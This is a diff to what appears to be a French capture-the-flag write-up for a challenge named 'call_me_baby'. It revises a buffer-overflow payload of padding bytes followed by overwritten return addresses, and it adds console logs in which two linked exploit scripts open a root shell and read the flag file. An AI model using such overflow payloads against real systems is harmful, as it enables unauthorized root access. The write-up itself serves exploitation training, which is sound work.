@@ -415,7 +415,7 @@ ls
 README.md  call_me_baby  exploit.py
 ```
 
-Le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+b"\x66\x11\x40\x00"+"\x00"*4+b"\x8a\x11\x40\x00"+"\x00"*4`.
+Le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
 
 ## Solution 2
 
@@ -475,4 +475,34 @@ Le payload est donc `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
 
 # Exploit
 
-De la même manière que le chall précedent, on utilise [ce script python](./exploit.py) pour se connecter, envoyer le payload, et interagir avec le shell.
+De la même manière que le chall précedent, on utilise des scripts python pour se connecter, envoyer le payload, et interagir avec le shell.
+
+## Exploit 1
+
+[Script](./exploit1.py)
+
+```console
+$ python3 exploit1.py 
+b'Write your love letter: \n'
+whoami
+b'root\n'
+ls
+b'call_me_baby\ncall_me_baby.c\ncore\nflag.txt\n'
+cat flag.txt
+b'FLAG{C4ll1ng_b4by...}\n'
+```
+
+## Exploit 2
+
+[Script](./exploit2.py)
+
+```console
+$ python3 exploit2.py 
+b'Write your love letter: \n'
+whoami
+b'root\n'
+ls
+b'call_me_baby\ncall_me_baby.c\ncore\nflag.txt\n'
+cat flag.txt
+b'FLAG{C4ll1ng_b4by...}\n'
+```
